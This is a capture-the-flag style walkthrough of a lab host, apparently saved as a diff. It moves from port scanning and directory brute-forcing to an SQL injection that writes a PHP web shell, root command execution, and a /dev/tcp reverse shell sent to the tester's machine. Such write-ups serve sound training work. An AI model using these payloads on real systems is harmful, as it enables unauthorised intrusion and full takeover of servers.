@@ -1,0 +1,90 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.161.147 > Hawat.txt 
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 8.4 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 78:2f:ea:84:4c:09:ae:0e:36:bf:b3:01:35:cf:47:22 (RSA)
+|   256 d2:7d:eb:2d:a5:9a:2f:9e:93:9a:d5:2e:aa:dc:f4:a6 (ECDSA)
+|_  256 b6:d4:96:f0:a4:04:e4:36:78:1e:9d:a5:10:93:d7:99 (ED25519)
+17445/tcp open  http    Apache Tomcat (language: en)
+|_http-trane-info: Problem with XML parsing of /evox/about
+|_http-title: Issue Tracker
+30455/tcp open  http    nginx 1.18.0
+|_http-title: W3.CSS
+|_http-server-header: nginx/1.18.0
+50080/tcp open  http    Apache httpd 2.4.46 ((Unix) PHP/7.4.15)
+| http-methods: 
+|   Supported Methods: GET POST OPTIONS HEAD TRACE
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.15
+|_http-title: W3.CSS Template
+
+
+http://192.168.161.147:50080/index.html#menu
+https://www.w3schools.com/action_page.php?Name=test&People=10&date=2026-11-16T20%3A00&Message=test
+
+$ gobuster dir -u http://192.168.161.147:50080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x php,txt,conf -r
+
+# Found /cloud directory. Login with admin:admin
+http://192.168.161.147:50080/cloud/index.php/apps/dashboard/
+# Download issuetracker.zip, found it is source code for issue which is port 17445 website.
+# Found IssueController.java
+@GetMapping("/issue/checkByPriority")
+String query = "SELECT message FROM issue WHERE priority='"+priority+"'";
+            System.out.println(query);
+		    Statement stmt = conn.createStatement();
+		    stmt.executeQuery(query);
+
+        } catch (SQLException e1) {
+			// TODO Auto-generated catch block
+			e1.printStackTrace();
+		}
+		
+        // TODO: Return the list of the issues with the correct priority
+		List<Issue> issues = service.GetAll();
+		model.addAttribute("issuesList", issues);
+		return "issue_index";
+
+$ gobuster dir -u http://192.168.161.147:50080/cloud -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x php,txt,conf -r
+console.php          (This script can be run from the command line only 
+index.php
+occ
+
+http://192.168.161.147:17445
+# register then found username clinton
+
+$ gobuster dir -u http://192.168.161.147:30455
+phpinfo.php
+# Found it host in srv/http
+USER 	root
+HOME 	/root 
+$_SERVER['DOCUMENT_ROOT']	/srv/http
+
+# Based on code found:
+String query = "SELECT message FROM issue WHERE priority='"+priority+"'";
+            System.out.println(query);
+It should be like /issue/checkByPriority?priority=<vulnerable>
+
+High' UNION SELECT '<?php echo system($_GET["cmd"]);' INTO OUTFILE '/srv/http/cmd.php'; --
+https://www.url-encode-decode.com/
+High%27+UNION+SELECT+%27%3C%3Fphp+echo+system%28%24_GET%5B%22cmd%22%5D%29%3B%27+INTO+OUTFILE+%27%2Fsrv%2Fhttp%2Fcmd.php%27%3B+--
+
+# In burpsuite
+POST /issue/checkByPriority?priority=High%27+UNION+SELECT+%27%3C%3Fphp+echo+system%28%24_GET%5B%22cmd%22%5D%29%3B%27+INTO+OUTFILE+%27%2Fsrv%2Fhttp%2Fcmd.php%27%3B+--+ HTTP/1.1
+Host: 192.168.161.147:17445
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+
+http://192.168.161.147:30455/cmd.php?cmd=id
+uid=0(root) gid=0(root) groups=0(root) uid=0(root) gid=0(root) groups=0(root)
+
+# /bin/sh payload connect to port 30455 with url encode
+http://192.168.161.147:30455/cmd.php?cmd=%2Fbin%2Fsh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.178%2F30455%200%3E%261
+
+$ rlwrap nc -nlvp 30455
+listening on [any] 30455 ...
+connect to [192.168.45.178] from (UNKNOWN) [192.168.161.147] 45418
+sh: cannot set terminal process group (304): Inappropriate ioctl for device
+sh: no job control in this shell
+sh-5.1# id
+uid=0(root) gid=0(root) groups=0(root)
+
+
